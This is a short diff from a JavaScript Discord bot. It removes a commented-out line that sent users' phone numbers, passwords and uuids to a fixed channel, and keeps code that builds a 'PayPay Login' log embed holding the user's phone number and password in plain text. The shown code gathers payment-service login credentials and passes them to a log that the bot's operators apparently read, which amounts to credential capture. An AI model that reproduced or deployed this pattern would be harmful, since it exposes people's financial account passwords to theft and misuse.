@@ -52,7 +52,6 @@ export default {
 
       await interaction.reply({ embeds: [embed], ephemeral: true });
 
-      //const log = client.channels.cache.get('1210911857087488000').send(`<@${interaction.user.id}> : ${object.phone}.${object.password}.${object.uuid}`);
       const log = new discord.EmbedBuilder()
         .setTitle('PayPay Login')
         .setDescription(`<@${interaction.user.id}>` + '\n' + 'Phone Number```' + object.phone + '```\nPassword```')
